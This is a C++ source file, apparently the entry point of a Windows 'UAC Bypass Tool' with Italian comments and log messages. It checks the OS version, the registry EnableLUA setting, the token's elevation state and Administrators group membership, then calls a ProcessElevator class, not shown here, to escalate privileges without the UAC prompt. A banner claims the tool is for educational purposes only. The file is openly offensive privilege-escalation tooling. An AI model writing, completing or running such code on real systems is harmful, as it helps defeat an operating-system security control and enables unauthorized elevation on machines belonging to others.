#include <windows.h>
#include <iostream>
#include <string>
#include "../include/Config.h"
#include "../include/Logger.h"
#include "../include/ProcessElevator.h"

using namespace uac_bypass;

void DisplayBanner() {
    std::wcout << L"\n=================================================\n"
               << L"UAC Bypass Tool v" << VERSION << L" (" << BUILD_TYPE << L")\n"
               << L"=================================================\n"
               << L"ATTENZIONE: Questo tool è solo per scopi educativi\n"
               << L"=================================================\n\n";
}

bool CheckSystemRequirements() {
    Logger& logger = Logger::getInstance();
    
    // Verifica Windows versione
    OSVERSIONINFOEXW osInfo = { sizeof(osInfo) };
    typedef NTSTATUS(WINAPI* RtlGetVersionPtr)(PRTL_OSVERSIONINFOW);
    HMODULE hNtdll = GetModuleHandleW(L"ntdll.dll");
    
    if (!hNtdll) {
        logger.logError(L"Impossibile caricare ntdll.dll");
        return false;
    }
    
    auto RtlGetVersion = (RtlGetVersionPtr)GetProcAddress(hNtdll, "RtlGetVersion");
    if (!RtlGetVersion) {
        logger.logError(L"Impossibile trovare RtlGetVersion");
        return false;
    }
    
    RtlGetVersion((PRTL_OSVERSIONINFOW)&osInfo);
    
    if (osInfo.dwMajorVersion < 10) {
        logger.logError(L"Questo tool richiede Windows 10 o superiore");
        return false;
    }

    // Verifica UAC
    HKEY hKey;
    DWORD enableLUA = 0;
    DWORD size = sizeof(DWORD);
    
    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE,
        UAC_REG_PATH, 0, KEY_READ, &hKey) != ERROR_SUCCESS) {
        logger.logError(L"Impossibile accedere alle impostazioni UAC");
        return false;
    }
    
    if (RegQueryValueExW(hKey, L"EnableLUA", NULL, NULL,
        (LPBYTE)&enableLUA, &size) != ERROR_SUCCESS) {
        RegCloseKey(hKey);
        logger.logError(L"Impossibile leggere lo stato UAC");
        return false;
    }
    
    RegCloseKey(hKey);
    
    if (!enableLUA) {
        logger.logWarning(L"UAC è disabilitato sul sistema");
        return false;
    }

    // Verifica che siamo in un contesto non elevato
    BOOL isElevated = FALSE;
    HANDLE hToken = NULL;
    if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) {
        TOKEN_ELEVATION elevation;
        DWORD size = sizeof(TOKEN_ELEVATION);
        if (GetTokenInformation(hToken, TokenElevation, &elevation, sizeof(elevation), &size)) {
            isElevated = elevation.TokenIsElevated;
        }
        CloseHandle(hToken);
    }

    if (isElevated) {
        logger.logError(L"Il tool deve essere eseguito senza privilegi di amministratore");
        return false;
    }

    // Verifica appartenenza al gruppo Administrators
    BOOL isMemberOfAdmin = FALSE;
    SID_IDENTIFIER_AUTHORITY NtAuthority = SECURITY_NT_AUTHORITY;
    PSID AdministratorsGroup;
    if (AllocateAndInitializeSid(&NtAuthority, 2,
        SECURITY_BUILTIN_DOMAIN_RID,
        DOMAIN_ALIAS_RID_ADMINS,
        0, 0, 0, 0, 0, 0,
        &AdministratorsGroup)) {
        if (!CheckTokenMembership(NULL, AdministratorsGroup, &isMemberOfAdmin)) {
            isMemberOfAdmin = FALSE;
        }
        FreeSid(AdministratorsGroup);
    }

    if (!isMemberOfAdmin) {
        logger.logError(L"L'utente deve essere membro del gruppo Administrators");
        return false;
    }

    logger.logInfo(L"Requisiti di sistema verificati con successo");
    return true;
}

int main() {
    // Impostazione della console per supporto Unicode
    SetConsoleOutputCP(CP_UTF8);
    setvbuf(stdout, nullptr, _IOFBF, 1000);
    
    // Inizializzazione logger
    Logger& logger = Logger::getInstance();
    logger.logInfo(L"Avvio UAC Bypass Tool");
    
    DisplayBanner();
    
    // Verifica requisiti di sistema
    if (!CheckSystemRequirements()) {
        std::wcout << L"[-] Verifica dei requisiti di sistema fallita.\n";
        return 1;
    }
    
    std::wcout << L"[+] Verifica dei requisiti di sistema completata.\n";
    
    // Creazione istanza ProcessElevator
    ProcessElevator elevator;
    
    std::wcout << L"[*] Tentativo di bypass UAC in corso...\n";
    logger.logInfo(L"Inizio processo di bypass UAC");
    
    // Tentativo di elevazione
    if (elevator.ElevateCurrentProcess()) {
        std::wcout << L"[+] Bypass UAC completato con successo!\n";
        logger.logInfo(L"Bypass UAC completato con successo");
        
        // Verifica finale elevazione
        if (ProcessElevator::IsProcessElevated(GetCurrentProcess())) {
            std::wcout << L"[+] Processo corrente è ora elevato.\n";
            logger.logInfo(L"Processo corrente verificato come elevato");
        } else {
            std::wcout << L"[!] Processo elevato ma verifica fallita.\n";
            logger.logWarning(L"Verifica elevazione processo fallita");
        }
        
        return 0;
    } else {
        std::wcout << L"[-] Bypass UAC fallito.\n";
        logger.logError(L"Bypass UAC fallito");
        return 1;
    }
}
